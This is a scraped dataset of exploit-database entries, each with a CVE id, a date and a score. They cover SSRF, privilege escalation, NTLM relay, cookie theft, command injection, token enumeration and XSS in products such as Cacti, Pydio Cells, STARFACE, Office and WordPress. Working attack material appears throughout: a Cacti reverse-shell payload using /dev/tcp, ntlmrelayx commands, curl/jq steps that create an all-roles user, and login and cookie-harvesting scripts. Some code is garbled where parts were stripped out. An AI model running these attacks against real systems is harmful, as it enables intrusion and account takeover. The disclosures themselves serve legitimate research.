IBM Navigator for i supports the vast majority of tasks that were available in the System i Navigator Windows client application. This Web application is part of the base IBM i operating system, and can be easily accessed from your web browser. Server Side Request Forgery CVE-2024-51463 IBM i is vulnerable to server-side request forgery . This may allow an authenticated attacker to send unauthorized requests from the system, potentially leading to network enumeration or facilitating other attacks. post auth server side request forgery on non managed nodes to external hosts on any TCP ports. There are two call vectors that can be abused here, one is the ""Test TLS connection"" but it only allows connections to TCP port 9476. However, there exists another servlet method called ""testConnectPort"" which an authenticated attacker can use to connect to any IP and PORT outside of the LAN. This can be abused for port scans, information disclosure, exfil data., bypass firewall rules to attack non managed nodes or connect to attacker controlled C2 infrastructure. This SSRF relies on exploiting a HTTP servlet generated security token bypass CVE-2024-51464, where intercepted HTTP request MN tokens are incremented or padded with zero. This attacker controlled MN token is now seen as valid and the HTTP 403 Forbidden restriction is bypassed. [Exploit/",0.00029,5.4

CVE-2024-24409,2025-04-09,exploitdb,"Exploit Title: ManageEngine ADManager Plus Build < 7210 Elevation of Privilege Vulnerability Exploit Author: Metin Yunus Kandemir Vendor Homepage: <URL> Software Link: <URL> Details: <URL> Version: ADManager Plus Build < 7210 Tested against: Build 7203 CVE: CVE-2024-24409 Description The Modify Computers is a predefined role in ADManager for managing computers. If a technician user has the Modify Computers privilege over a computer can change the userAccountControl and msDS-AllowedToDelegateTo attributes of the computer object. In this way, the technician user can set Constrained Kerberos Delegation over any computer within the Organizational Unit that the user was delegated. Contrary to what ADManager claims the user who has the Modify Computers role can change the privilege of computer objects in the Active Directory. The Constrained Kerberos Delegation can be set for any service such as CIFS, LDAP, HOST services. Then the user can access these services by abusing the Constrained Kerberos Delegation. In addition, the Unconstrained Kerberos Delegation can be set over the computer objects by changing the userAccountControl attribute. Normally, only users that have SeEnableDelegationPrivilege privilege can set constrained kerberos delegation. Only members of the BUILTIN\Administrators group have this privilege by default. The delegated user for an Organizational Unit can not set constrained kerberos delegation even if a user has the GenericAll right over a computer account, so the delegation process in Active Directory does not grant this privilege. However, the technician user can use the SeEnableDelegationPrivilege right via the Modify Computers role. Vulnerability reasons 1. ADMP Web App Authorization issue: Assigning a predefined Modify Computers role delegates the technician user to modify custom attributes of computers unexpectedly. Even though it appears that this privilege is not granted in the UI, the Additional Custom Attribute property is assigned and this leads to broken access control vulnerability. 2. There is no restriction for editing the userAccountControl and msDS-AllowedToDelegateTo attributes of the computer objects. The ADMP application performs changes with domain admin privileges as designed so that if we can bypass some restrictions , our requests are applied with domain admin privileges. This way we can edit the attributes userAccountControl and msDS-AllowedToDelegateTo. Impact A technician user elevates privileges from Domain User to Domain Admin. For example, the user can set Constrained Kerberos Delegation over CLIENT1$ for the CIFS service of the domain controller and access the CIFS service. As a result, the user is delegated to manage CLIENT1$ but he can access the CIFS service of the domain controller impersonating a user unexpectedly. Proof Of Concept <URL>",0.00317,8.8

This user's permissions will allow full control over the organization but will still prevent him to interact with other orgs. #Impact This vulnerability would allow a user to obtain unrestricted access to the influxdb instance. A similar condition might fully compromise Confidentiality, Integrity and Availability of data owned by users of different organizations. Additionally, since operator token has administrative permissions, Availability and Integrity of the entire influxdb instance might be compromised. #Prerequisites/Limitations 1. Attacker must have a valid allAccess token 2. allAccess token must have been created in the same Org where an operator token resides 3. Attacker must be able to interact with influxdb instance via CLI or APIs #Steps to Reproduce Case 1: Exploitation via influxdb APIs: Python Version: 3 Requirements: influxdbclient==1.41.0 Script usage % python3 ./CVE-2024-30896.py -h usage: CVE-2024-30896.py ] ] optional arguments: -h, --help show this help message and exit -t TOKEN, --token TOKEN Custom or allAccess token to access influx DB instance -e ENDPOINTURL, --endpointUrl ENDPOINTURL Endpoint Url of influxdb instance argParser.addargument argParser.addargument argParser.addargument args = argParser.parseargs Using user retrieved values or default ones allaccesstoken = "" "" influxendpointurl = "" "" Defining some colors red = ""\033 In order to understand if a token is of type ""operator"" we need to enumerate all permissions and look for ""write/auths"" on org 'None' -> Unrescticted access try: for auth in auths: if auth.permissions: for perm in auth.permissions: if perm.action == ""write"" and perm.resource.org == None and perm.resource.type == ""authorizations"": optokens.append except Exception as e: logger.error + f""{endc}"") print sys.exit logger.info print)} operator tokens found.\n\nListing all operator tokens:\n{endc}"") for opt in optokens: print",0.0305,9.1
CVE-2024-23922,2025-04-08,exploitdb,"Exploit Title: Sony XAV-AX5500 Firmware Update Validation Remote Code Execution Date: 11-Feb-2025 Exploit Author: lkushinada Vendor Homepage: <URL> Software Link: <URL> Version: 1.13 Tested on: Sony XAV-AX5500 CVE : CVE-2024-23922 From NIST CVE Details: This vulnerability allows physically present attackers to execute arbitrary code on affected installations of Sony XAV-AX5500 devices. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of software updates. The issue results from the lack of proper validation of software update packages. An attacker can leverage this vulnerability to execute code in the context of the device. Was ZDI-CAN-22939 # Summary Sony's firmware validation for a number of their XAV-AX products relies on symetric cryptography, obscurity of their package format, and a weird checksum method instead of any real firmware signing mechanism. As such, this can be exploited to craft updates which bypass firmware validation and allow a USB-based attacker to obtain RCE on the infotainment unit. What's not mentioned in the CVE advisories, is that this method works on the majority of Sony's infotainment units and products which use a similar chipset or firmware package format. Tested to work on most firmware versions prior to v2.00. # Threat Model An attacker with physical access to an automotive media unit can typically utilize other methods to achieve a malicious outcome. The reason to investigate the firmware to the extent in this post is academic, exploratory, and cautionary, i.e. what other systems are protected in a similar manner? if they are, how trivial is it to bypass? # Disclaimer The information in this article is for educational purposes only. Tampering with an automotive system comes with risks which, if you don't understand, you should not be undertaking. THE AUTHORS DISCLAIM ANY AND ALL RESPONSIBILITY FOR CONSEQUENTIAL OR INCIDENTAL DAMAGES ARISING FROM THE USE OF ANYTHING IN THIS DOCUMENT. # The Unit # #Processors # - DAC # - System Management Controller # - Applications Processor # - Display Processor Coming from a mobile and desktop computer environment, one may be use to thinking about the Applications Processor as the most powerful chip in the system in terms of processing power, size, power consumption, and system hierarchy. The first oddity of this platform is that the application processor is not the most powerful; that honor goes to the DAC, a beefy ARM chip on the board. The application processor does not appear to be the orchestrator of the components on the system. The SMC tkes which takes the role of watchdog, power state management, and input routing. For our purposes, it is the Applications processor we're interested in, as it is the system responsible for updating the unit via USB. # #Interfaces We're going to be attacking the unit via USB, as it's the most readily exposed interface to owners and would-be attackers. Whilst the applications processor does have a UART interface, the most recent iterations of the unit do not expose any headers for debugging via UART, and the one active UART line found to be active was for message passing between the SMC and app processor, not debug purposes. Similarly, no exposed JTAG interfaces were found to be readily exposed on recent iterations of the unit. Sony's documentation suggests these are not enabled, but this could not be verified during testing. At the very least, JTAG was not found to be exposed on an accessible interface. # #Storage The boards analyzed had two SPI NOR flash chips, one with an unencrypted firmware image on it. This firmware was RARd. The contents of SPI flash was analyzed to determine many of the details discussed in this report. # #The Updater Updates are provided on Sony's support website. A ZIP package is provided with three files: # - SHDS1132.up6 # - SHMC1132.u88 # - SHSO1132.fir The largest of these files , the .fir, is in a custom format, and appears encrypted. The FIR file has a header which contains the date of firmware publication, the strings KRSELCO and SKIP, a chunk of zeros, and then a highish entropy section, and some repeating patterns of interest: 00002070 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.~.X#..\| 00002860 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.~.X#..\| 00744110 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.~.X#..\| 00800020 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.~.X#..\| # #SPI Flash Dumping the contents of the SPI flash shows a similar layout, with slightly different offsets: 00001fe0 10 10 10 10 10 10 10 10 ff ff ff ff ff ff ff ff |.| 00001ff0 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |.| 000027f0 ff ff ff ff ff ff ff ff ff ff ff ff 00 03 e7 52 |.R| 00002800 52 61 72 21 1a 07 00 cf 90 73 00 00 0d 00 00 00 |Rar!.s.| 0007fff0 ff ff ff ff ff ff ff ff ff ff ff ff 00 6c 40 8b |.l@.| 00080000 52 61 72 21 1a 07 00 cf 90 73 00 00 0d 00 00 00 |Rar!.s.| 00744090 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |.| 00778000 This given the offsets and spacing, we suspect that the .FIR matches the contents of the SPI. Decompressing the RARs at the 0x2800 and 0x80000, we get the recovery and main applications. Once we remove the packaging bytes, seeing that the repetive patterns align with FF's, gives us a strong indication the encryption function is operating in an ECB-style configuration, giving us an avenue, even if we do not recover the key, to potentially make modifications to the firmware depending on how the checksum is being calculated. # #Firmware The recovery application contains the decompression, decryption and checksum methods. Putting the recovery16.bin into ghidra and setting the memory map to load us in at 0x2800, we start taking a look at the relevant functions by way of: # - looking for known strings # - analyizing the logic and looking for obvious ""if this passed, begin the update, else fail"" # - looking for things that look like encryption Of interest to us, there is: # - 0x0082f4 - a strcmp between KRSELCO and the address the incoming firmware update is at, plus 0x10 # - 0x00897a - a function which sums the total number of bytes until we hit 0xA5A5A5A5 # - 0x02d4ce - the AES decryption function # - 0x040dd4 - strcmp # - 0x040aa4 - memcpy # - 0x046490 - the vendor plus the a number an idiot would use for their luggage, followed by enough padding zeros to get us to a 16 byte key This gives us all the information we need, other than making some guesses as to the general package and header layout of the update package, to craft an update packager that allows arbitrary modification of the firmware. # Proof of Concept The",0.00149,6.8

It provides end-to-end protection of resources over geographically dispersed intranets and extranets. In addition to state-of-the-art security policy management, IBM Security Verify Access provides authentication, authorization, data security, and centralized resource management capabilities. IBM Security Verify Access offers the following features: Authentication ~ Provides a wide range of built-in authenticators and supports external authenticators. Authorization ~ Provides permit and deny decisions for protected resources requests in the secure domain through the authorization API. Data security and centralized resource management ~ Manages secure access to private internal network-based resources by using the public Internet's broad connectivity and ease of use with a corporate firewall system. = < 1. Detailed Description > = During a Penetration Test of the OAuth flow for a client, it was found an Open Redirect vulnerability that can led to the leakage of the OAuth ""code"" variable. It was possible to bypass the parser's logic responsible for verifying the correctness and the validity of the ""redirecturi"" parameter during an OAuth flow by leveraging RFC 3986 providing a username and password directly in the Uniform Resource Identifier . By providing as the ""username"" field a legitimate and expected domain, it was possible to bypass the whitelist filter used by ""IBM Security Verify Access"" and cause an Open Redirect to any arbitrary domain controlled by the attacker, not only altering the expected flow and redirect a user to a malicious Web site that would appear to be trusted.

CVE-2024-38200,2025-04-03,exploitdb,"Exploit Title: Microsoft Office 2019 MSO Build 1808 - NTLMv2 Hash Disclosure Exploit Author: Metin Yunus Kandemir Vendor Homepage: <URL> Software Link: <URL> Details: <URL> Version: Microsoft Office 2019 MSO Build 1808 , Microsoft 365 MSO Tested against: Windows 11 CVE: CVE-2024-38200 Description MS Office URI schemes allow for fetching a document from remote source. MS URI scheme format is '< scheme-name >:< command-name >""|""< command-argument-descriptor > ""|""< command-argument >' . Example: ms-word:ofe|u| <URL> When the URI ""ms-word:ofe|u| <URL> is invoked from a victim computer. This behaviour is abused to capture and relay NTLMv2 hash over SMB and HTTP. For detailed information about capturing a victim user's NTLMv2 hash over SMB, you can also visit <URL> Proof Of Concept If we add a DNS A record and use this record within the Office URI, Windows will consider the hostname as part of the Intranet Zone. In this way, NTLMv2 authentication occurs automatically and a standard user can escalate privileges without needing a misconfigured GPO. Any domain user with standard privileges can add a non-existent DNS record so this attack works with default settings for a domain user. 1. Add a DNS record to resolve hostname to attacker IP address which runs ntlmrelayx. It takes approximately 5 minutes for the created record to start resolving. $ python dnstool.py -u 'unsafe.local\testuser' -p 'pass' -r 'attackerhost' --action 'add' --data --zone unsafe.local 2. Fire up ntlmrelayx with following command $ python ntlmrelayx.py -t ldap://DC-IP-ADDRESS --escalate-user testuser --http-port 8080 3. Serve following HTML file using Apache server. Replace hostname with added record . Microsoft Office 4. Send the URL of the above HTML file to a user with domain admin privileges. You should check whether the DNS record is resolved with the ping command before sending the URL. When the victim user navigates to the URL, clicking the 'Open' button is enough to capture the NTLMv2 hash. 5. The captured NTLMv2 hash over HTTP is relayed to Domain Controller with ntlmrelayx. As a result, a standard user can obtain DCSync and Enterprise Admins permissions under the default configurations with just two clicks.",0.59745,6.5

CVE-2024-6298,2025-04-02,exploitdb,"Exploit Title : ABB Cylon Aspect 3.08.01 - Remote Code Execution Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.01 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB BMS/BAS controller suffers from a remote code execution vulnerability. The vulnerable uploadFile function in bigUpload.php improperly reads raw POST data using the php://input wrapper without sufficient validation. This data is passed to the fwrite function, allowing arbitrary file writes. Combined with an improper sanitization of file paths, this leads to directory traversal, allowing an attacker to upload malicious files to arbitrary locations. Once a malicious file is written to an executable directory, an authenticated attacker can trigger the file to execute code and gain unauthorized access to the building controller.

Overview: Purpose and Target The script aims to extract cookies from a WordPress debug.log file, allowing the attacker to impersonate a logged-in user and access their account without authorization. 2. How the Code Works extractlatestcookies Function: Purpose: This function scans the contents of the debug.log file and uses a regular expression to extract cookies for logged-in WordPress users. How it Works: The function reads each line of the debug.log file. It searches for lines that contain cookies using the following regular expression: Cookie:\s.?wordpressloggedin+=%. This pattern matches WordPress login cookies and extracts the username and cookie value. The extracted cookie values are stored in a dictionary called usercookies, where the keys are usernames and the values are the corresponding cookie strings. chooseuser Function: Purpose: Once cookies are extracted, this function allows the attacker to select which user's cookie to use for impersonation. How it Works: It checks if there are any users available. If no cookies are found, it prints a message and exits the program. If cookies are found, it prints a list of users and asks the attacker to select one. Once a user is selected, the function returns the corresponding cookie for that user. Main Program: Purpose: The main part of the script handles the workflow of retrieving the debug.log file, extracting cookies, and allowing the attacker to choose which user to impersonate. How It Works: The script takes a URL as input, which is the target WordPress site , it passes the file content to the extractlatestcookies function to extract cookies. The attacker selects which user's cookie to use, and the script prints the cookie information. The attacker can then use this cookie to impersonate the selected user by setting it in their browser and accessing the WordPress admin panel . requests Library: This library is used to send HTTP requests to the target site and retrieve the debug.log file. argparse Library: This allows the user to input the target WordPress URL from the command line. sys.exit Function: The script uses this to exit the program in case of errors, such as when no users are found or the log file is inaccessible. 3. Potential for Abuse This script exploits a vulnerability in WordPress by targeting publicly accessible debug.log files. If a site has misconfigured logging, this file might be available to anyone on the internet. By accessing the debug.log file, an attacker can extract sensitive session cookies, impersonate users, and gain unauthorized access to WordPress accounts .",0.88493,9.8

Exploit Prerequisites: - The attacker is authenticated. - The privileges of the attacker allow to manage Devices and/or Graphs, e.g., ""Sites/Devices/Data"", ""Graphs"". - A Device that supports SNMP can be used. - Net-SNMP Graphs can be used. - snmp module of PHP is not installed. Example of an exploit: - Go to ""Console"" > ""Create"" > ""New Device"". - Create a Device that supports SNMP version 1 or 2. - Ensure that the Device has Graphs with one or more templates of: - ""Net-SNMP - Combined SCSI Disk Bytes"" - ""Net-SNMP - Combined SCSI Disk I/O"" - - In the ""SNMP Options"", for the ""SNMP Community String"" field, use a value like this: public\' ; touch /tmp/m3ssap0 ; \' - Click the ""Create"" button. - Check under /tmp the presence of the created file. To obtain a reverse shell, a payload like the following can be used. public\' ; bash -c ""exec bash -i &>/dev/tcp/ / <&1"" ; \' A similar exploit can be used editing an existing Device, with the same prerequisites, and waiting for the poller to run. It could be necessary to change the content of the ""Downed Device Detection"" field under the ""Availability/Reachability Options"" section with an item that doesn't involve SNMP .

CVE-2023-38357,2023-07-20,exploitdb,"Exploit Title: RWS WorldServer 11.7.3 - Session Token Enumeration Session tokens in RWS WorldServer have a low entropy and can be enumerated, leading to unauthorised access to user sessions. Details Product: WorldServer Affected Versions: 11.7.3 and earlier versions Fixed Version: 11.8.0 Vulnerability Type: Session Token Enumeration Security Risk: high Vendor URL: <URL> Vendor Status: fixed version released Advisory URL: <URL> Advisory Status: published CVE: CVE-2023-38357 CVE URL: <URL> Introduction ""WorldServer offers a flexible, enterprise-class translation management system that automates translation tasks and greatly reduces the cost of supporting large volumes of local language content."" More Details WorldServer associates user sessions with numerical tokens, which always are positive values below 2^31. The SOAP action ""loginWithToken"" allows for a high amount of parallel attempts to check if a token is valid. During analysis, many assigned tokens were found to be in the 7-digit range of values. An attacker is therefore able to enumerate user accounts in only a few hours. Proof of Concept In the following an example ""loginWithToken"" request is shown: POST /ws/services/WSContext HTTP/1.1 Content-Type: text/xml;charset=UTF-8 SOAPAction: """" Content-Length: 501 Host: <URL> Connection: close User-Agent: agent FUZZ - It can be saved as file ""login-soap.req"" and be used as a request template for the command-line HTTP enumerator monsoon to achieve many parallel requests: $ monsoon fuzz --threads 100 \ --template-file login-soap.req \ --range 1-2147483647 \ --hide-pattern ""InvalidSessionException"" \ ' <URL> Target URL: <URL> status header body value extract 500 191 560 5829099 500 191 556 6229259 200 191 3702 7545136 500 191 556 9054984 processed 12000000 HTTP requests in 2h38m38s 4 of 12000000 requests shown, 1225 req/s The --range parameter reflects the possible value range of 2^31 and for each value an HTTP request is sent to the WorldServer SOAP API where the FUZZ marker in the request template is replaced with the respective value. Also responses are hidden which contain ""InvalidSessionException"" as these sessions are invalid. Responses will yield a status code of 200 if an administrative session token is found. For an unprivileged user session, status code 500 is returned. Workaround Lower the rate at which requests can be issued, for example with a frontend proxy. Fix According to the vendor, upgrading to versions above 11.8.0 resolves the vulnerability. Security Risk Attackers can efficiently enumerate session tokens. In a penetration test, it was possible to get access to multiple user accounts, including administrative accounts using this method in under three hours. Additionally, by using such an administrative account it seems likely to be possible to execute arbitrary code on the underlying server by customising the REST API . Thus, the vulnerability poses a high risk.

CVE-2023-33243,2023-06-04,exploitdb,"Exploit Title: STARFACE 7.3.0.10 - Authentication with Password Hash Possible Affected Versions: 7.3.0.10 and earlier versions Fixed Versions: - Vulnerability Type: Broken Authentication Security Risk: low Vendor URL: <URL> Vendor Status: notified Advisory URL: <URL> Advisory Status: published CVE: CVE-2023-33243 CVE URL: <URL> Introduction ""When functionality and comfort come together, the result is a state-of-the-art experience that we've dubbed 'comfortphoning'. It's a secure, scalable digital communication solution that meets every need and wish. STARFACE is easy to integrate into existing IT systems and flexibly grows with your requirements."" More Details The image of STARFACE PBX in version 7.3.0.10 can be downloaded from the vendor's homepage . The included files can be further examined by either extracting the contents or running the image in a virtual machine. The web interface of the PBX uses the JavaScript file at the following path to submit the login form: js/prettifier.js The following two lines of the JavaScript file ""prettifier.js"" add the two parameters ""secret"" and ""ack"" to the form before being submitted: $form.add); $form.add; The JavaScript object ""defaultVals"" is included in the web application's source text. While the value of ""defaultVals.k"" was found to be the static hash of the PBX version, the value of ""defaultVals.bk"" contains a nonce only valid for the currently used session. Therefore, the form parameter ""ack"" is always the same value. For the form value ""secret"" the function ""createHash"" is called with different arguments. The value of ""defaultVals.isAd"" is set to ""false"" when login via Active Directory is disabled. The parameters ""liv"" and ""lpv"" contain the username and password entered into the form respectively. const createHash = function { if { return forAD.encode; return user + ':' + forSF); The expression right after the second return statement is the implementation used when Active Directory login is disabled which is the default setting. The return value is composed of the username separated via a colon from a value built using the ""forSF"" function. The ""forSF"" function was found to calculate the SHA512 hash value. When considering the arguments passed to the function, the hash is calculated as follows: SHA512) As can be seen, instead of the cleartext password the SHA512 hash of the password is used in the calculation. In conclusion, for the form value ""secret"" the following value is transmitted: username + "":"" + SHA512 If the SHA512 hash of a user's password is known, it can be directly used in the calculation of the ""secret"" during the login process. Knowledge of the cleartext password is not required. This finding was also verified by analysing the decompiled Java code of the server component. It was also found that the authentication process of the REST API is vulnerable in a very similar manner. Proof of Concept The following Python script can be used to perform a login by specifying a target URL, a username and the associated password hash: #!/usr/bin/env python3 import click import hashlib import re import requests import typing def getvaluesfromsession -> typing.Tuple: k, bk = , responsecontent = session.get.text kresult = re.search'"", responsecontent) bkresult = re.search'"", responsecontent) if kresult != None: k = kresult.group if bkresult != None: bk = bkresult.group return k, bk def weblogin -> bool: version, nonce = getvaluesfromsession if version == or nonce == : print return value = login + version + nonce + pwhash secret = hashlib.sha512).hexdigest data = { ""forward"": """", ""autologin"": ""false"", ""secret"": f""{login}:{secret}"", ""ack"": version, loginrequest = session.post.split print return True else: print return False def getnoncefromapi -> str: responsecontent = session.get.json return responsecontent if ""nonce"" in responsecontent else def restlogin: nonce = getnoncefromapi if nonce == : print return value = login + nonce + pwhash secret = hashlib.sha512).hexdigest data = {""loginType"": ""Internal"", ""nonce"": nonce, ""secret"": f""{login}:{secret}""} loginrequest = session.post token = responsedata if ""token"" in responsedata else ""none"" print .command .option .option .option def login: session = requests.session strippedurl = url.rstrip result = weblogin if result: restlogin if name == ""main"": login For example, the SHA512 hash of the password ""starface"" can be calculated as follows: $ echo -n ""starface"" | sha512sum a37542915e834f6e446137d759cdcb825a054d0baab73fd8db695fc49529bc8e52eb27979dd1dcc21849567bac74180f6511121f76f4a2a1f196670b7375f8ec - The Python script can be run as follows to perform a login as the user ""0001"" with the aforementioned hash: $ python3 login.py --url ' <URL> --login 0001 --pwhash 'a37542915e834f6e446137d759cdcb825a054d0baab73fd8db695fc49529bc8e52eb27979dd1dcc21849567bac74180f6511121f76f4a2a1f196670b7375f8ec' Session ID: 2CF09656E274F000FFAD023AF37629CE REST API Token: 51eef8f8vp3d3u81k0imjbuuu7 When the password hash is valid for the specified user of the targeted instance a session ID as well as a REST API token is returned. Afterwards, these values can be used to interact with the web application and the REST API. Workaround None Fix On 4 May 2023, version 8.0.0.11 was released. In this version the vulnerability was addressed with a temporary solution, such that the password hashes are encrypted before they are saved in the database. This approach prevents attackers from exploiting this vulnerability in scenarios where they have only acquired pure database access. However, attackers with system level access can bypass this temporary measure as they can extract the encryption key and decrypt the hashes in the database. A solution that fixes this vulnerability entirely is still in progress. Security Risk The web interface and REST API of STARFACE allow to login using the password hash instead of the cleartext password. This can be exploited by attackers who gained access to the application's database where the passwords are also saved as a SHA512 hash of the cleartext passwords. While the precondition for this attack could be the full compromise of the STARFACE PBX, another attack scenario could be that attackers acquire access to backups of the database stored on another system. Furthermore, the login via password hash allows attackers for permanent unauthorised access to the web interface even if system access was obtained only temporarily. Due to the prerequisites of obtaining access to password hashes, the vulnerability poses a low risk only.

CVE-2023-32749,2023-05-31,exploitdb,"Exploit Title: Pydio Cells 4.1.2 - Unauthorised Role Assignments Affected Versions: 4.1.2 and earlier versions Fixed Versions: 4.2.0, 4.1.3, 3.0.12 Vulnerability Type: Privilege Escalation Security Risk: high Vendor URL: <URL> Vendor Status: notified Advisory URL: <URL> Advisory Status: published CVE: CVE-2023-32749 CVE URL: <URL> Introduction ""Pydio Cells is an open-core, self-hosted Document Sharing and Collaboration platform specifically designed for organizations that need advanced document sharing and collaboration without security trade-offs or compliance issues."" More Details Users can share cells or folders with other users on the same Pydio instance. The web application allows to either select an already existing user from a list or to create a new user by entering a new username and password, if this functionality is enabled. When creating a new user in this way, a HTTP PUT request like the following is sent: PUT /a/user/newuser HTTP/2 Host: example.com User-Agent: agent Authorization: Bearer O48gvjD Content-Type: application/json Content-Length: 628 Cookie: token=AO ""Attributes"": { ""profile"": ""shared"", ""parameter:core.conf:lang"": ""\""en-us\"""", ""sendemail"": ""false"" ""Roles"": , ""Login"": ""newuser"", ""Password"": ""secret!"", ""GroupPath"": ""/"", ""Policies"": The JSON object sent in the body contains the username and password for the user to be created and an empty list for the key ""Roles"". The response contains a JSON object similar to the following: ""Uuid"": ""58811c4c-2286-4ca0-8e8a-14ab9dbca8ce"", ""GroupPath"": ""/"", ""Attributes"": { ""parameter:core.conf:lang"": ""\""en-us\"""", ""profile"": ""shared"" ""Roles"": ""Uuid"": ""58811c4c-2286-4ca0-8e8a-14ab9dbca8ce"", ""Label"": ""User newuser"", ""UserRole"": true, ""Policies"": ""Login"": ""newuser"", ""Policies"": , ""PoliciesContextEditable"": true The key ""Roles"" now contains a list with two objects, which seem to be applied by default. The roles list in the HTTP request can be modified to contain a list of all available UUIDs for roles, which can be obtained by using the user search functionality. This results in a new user account with all roles applied. By performing a login as the newly created user, access to all cells and non-personal workspaces of the whole Pydio instance is granted. Proof of Concept Login to the Pydio Cells web interface with a regular user and retrieve the JWT from the HTTP requests. This can either be done using an HTTP attack proxy or using the browser's developer tools. Subsequently, curl can be used as follows to retrieve a list of all users and their roles: $ export JWT="" "" $ curl --silent \ --header ""Authorization: Bearer $TOKEN"" \ --header 'Content-Type: application/json' \ --data '{}' \ <URL> | tee allusers.json {""Users"":} Afterwards, jq can be used to create a JSON document which can be sent to the Pydio REST-API in order to create the external user ""foobar"" with the password ""hunter2"" and all roles assigned: $ jq '.Users.Roles' allusers.json \ | jq -s 'flatten | ..Uuid | {Uuid: .}' \ | jq -s 'unique' \ | jq '{""Login"": ""foobar"", ""Password"": ""hunter2"", ""Attributes"": {""profile"": ""shared""}, ""Roles"": .}' \ | tee createuser.json ""Login"": ""foobar"", ""Password"": ""hunter2"", ""Attributes"": { ""profile"": ""shared"" ""Roles"": Finally, the following curl command can be issued to create the new external user: $ curl --request PUT \ --silent \ --header ""Authorization: Bearer $JWT"" \ --header 'Content-Type: application/json' \ --data .json \ <URL> Now, login with the newly created user to access all cells and non-personal workspaces. Workaround Disallow the creation of external users in the authentication settings. Fix Upgrade Pydio Cells to a version without the vulnerability. Security Risk Attackers with access to any regular user account for a Pydio Cells instance can extend their privileges by creating a new external user with all roles assigned. Subsequently, they can access all folders and files in any cell and workspace, except for personal workspaces. The creation of external users is activated by default. Therefore, the vulnerability is estimated to pose a high risk.

CVE-2023-32751,2023-05-31,exploitdb,"Exploit Title: Pydio Cells 4.1.2 - Cross-Site Scripting via File Download Affected Versions: 4.1.2 and earlier versions Fixed Versions: 4.2.0, 4.1.3, 3.0.12 Vulnerability Type: Cross-Site Scripting Security Risk: high Vendor URL: <URL> Vendor Status: notified Advisory URL: <URL> Advisory Status: published CVE: CVE-2023-32751 CVE URL: <URL> Introduction ""Pydio Cells is an open-core, self-hosted Document Sharing and Collaboration platform specifically designed for organizations that need advanced document sharing and collaboration without security trade-offs or compliance issues."" More Details When a file named ""xss.html"" is downloaded in the Pydio Cells web application, a download URL similar to the following is generated: <URL> ?AWSAccessKeyId=gateway &Expires=1682495748 &Signature=920JV0Zy%2BrNYXjak7xksAxRpRp8%3D &response-content-disposition=attachment%3B%20filename%3Dxss.html &pydiojwt=qIe9DUut-OicxRzNVlynMf6CTENB0J-J The URL is akin to a presigned URL as used by the Amazon S3 service. It contains the URL parameter ""response-content-disposition"" which is set to ""attachment"" causing the response to contain a ""Content-Disposition"" header with that value. Therefore, the browser downloads the file instead of interpreting it. The URL also contains a signature and expiry timestamp, which are checked by the backend. Unlike a presigned URL as used by S3, the URL also contains the parameter ""pydiojwt"" with the JWT of the user for authentication. Furthermore, the access key with the ID ""gateway"" is referenced, which can be found in the JavaScript sources of Pydio Cells together with the secret: awsSdk.default.config.update With this information it is possible to change the URL parameter ""response-content-disposition"" to the value ""inline"" and then calculate a valid signature for the resulting URL. Furthermore, the content type of the response can be changed to ""text/html"" by also adding the URL parameter ""response-content-type"" with that value. This would result in a URL like the following for the previously shown example URL: <URL> AWSAccessKeyId=gateway &Expires=1682495668 &Signature=HpKue0YQZrnp%2B665Jf1t7ONgfRg%3D &response-content-disposition=inline &response-content-type=text%2Fhtml &pydiojwt=qIe9DUut-OicxRzNVlynMf6CTENB0J-J Upon opening the URL in a browser, the HTML included in the file is interpreted and any JavaScript code is run. Proof of Concept Upload a HTML file into an arbitrary location of a Pydio Cells instance. For example with the following contents: - Cross-Site Scriping - The contained JavaScript code reads the JWT access token for Pydio Cells from the browser's local storage object and opens a message box. Instead of just displaying the JWT, it could also be sent to an attacker. The following JavaScript function can then be run within the browser's developer console to generate a presigned URL for the HTML file: async function getPresignedURL { let client = PydioApi.getClient; let node = new AjxpNode; let metadata = {Bucket: ""io"", ResponseContentDisposition: ""inline"", Key: path, ResponseContentType: ""text/html""}; let url = await client.buildPresignedGetUrl; return url; await getPresignedURL; The code has to be run in context of Pydio Cells while being logged in. If the resulting URL is opened in a browser, the JavaScript code contained in the HTML file is run. If the attack is conducted in the described way, the JWT of the attacker is exposed through the URL. However, this can be circumvented by first generating a public URL for the file and then constructing the presigned URL based on the resulting download URL. Workaround No workaround known. Fix Upgrade Pydio Cells to a version without the vulnerability. Security Risk Attackers that can upload files to a Pydio Cells instance can construct URLs that execute arbitrary JavaScript code in context of Pydio Cells upon opening. This could for example be used to steal the authentication tokens of users opening the URL. It is likely that such an attack succeeds, since sharing URLs to files hosted using Pydio Cells is a common use case of the application. Therefore, the vulnerability is estimated to pose a high risk.

CVE-2023-32750,2023-05-31,exploitdb,"Exploit Title: Pydio Cells 4.1.2 - Server-Side Request Forgery Affected Versions: 4.1.2 and earlier versions Fixed Versions: 4.2.0, 4.1.3, 3.0.12 Vulnerability Type: Server-Side Request Forgery Security Risk: medium Vendor URL: <URL> Vendor Status: notified Advisory URL: <URL> Advisory Status: published CVE: CVE-2023-32750 CVE URL: <URL> Introduction ""Pydio Cells is an open-core, self-hosted Document Sharing and Collaboration platform specifically designed for organizations that need advanced document sharing and collaboration without security trade-offs or compliance issues."" More Details Using the REST-API of Pydio Cells it is possible to start jobs. For example, when renaming a file or folder an HTTP request similar to the following is sent: PUT /a/jobs/user/move HTTP/2 Host: example.com User-Agent: agent Accept: application/json Authorization: Bearer G4ZRN Content-Type: application/json Content-Length: 140 ""JobName"": ""move"", ""JsonParameters"": ""{\""nodes\"":,\""target\"":\""cell/renamed.txt\"",\""targetParent\"":false}"" The body contains a JSON object with a job name and additional parameters for the job. Besides the ""move"" job, also a job with the name ""remote-download"" exists. It takes two additional parameters: ""urls"" and ""target"". In the ""urls"" parameter, a list of URLs can be specified and in the parameter ""target"" a path can be specified in which to save the response. When the job is started, HTTP GET requests are sent from the Pydio Cells server to the specified URLs. The responses are saved into a 